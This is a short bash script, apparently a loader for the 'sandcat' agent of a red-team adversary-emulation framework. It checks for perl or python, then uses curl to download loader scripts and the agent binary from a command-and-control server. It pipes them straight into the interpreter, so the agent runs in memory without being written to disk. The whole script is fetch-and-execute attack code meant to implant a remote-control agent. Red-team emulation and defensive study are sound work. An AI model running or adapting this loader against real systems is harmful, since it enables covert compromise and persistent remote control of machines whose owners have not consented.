#!/bin/bash

set -e

export SC_PROC_NAME=${SC_PROC_NAME:-'sandcat'}
export SC_DEFAULTSERVER=${SC_DEFAULTSERVER:-'http://localhost:8888'}
export SC_DEFAULTGROUP=${SC_DEFAULTGROUP:-'red'}

declare -a binaries=("python3" "python" "perl")

# used for curl requests that require additional header values
CURL_CMD=(curl -s -X POST -H "server:$SC_DEFAULTSERVER")
for i in "${binaries[@]}"
do
    cmd=$(command -v $i)
    if [[ -x "$cmd" ]]; then
        if [[ "$i" == "perl" ]]; then
            echo "Perl exists, crafting Perl in-memory loader"
            (curl -s -X POST -H 'file:sandcat-elfload.pl.1' $SC_DEFAULTSERVER/file/download &&
            ${CURL_CMD[@]} -H 'file:sandcat.go' -H 'platform:linux' $SC_DEFAULTSERVER/file/download |
            perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' &&
            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_DEFAULTSERVER/file/download; ) | perl
            break
        elif [[ "$i" == "python3" ]] || [[ "$i" == "python" ]]; then
            echo "Python/python3 exists"
            curl -s -X POST -H 'file:sandcat-elfload.py' $SC_DEFAULTSERVER/file/download | $i
            break
        fi
    else
        echo "binary doesn't exist"
    fi
done

unset SC_PROC_NAME
unset SC_DEFAULTSERVER
unset SC_DEFAULTGROUP
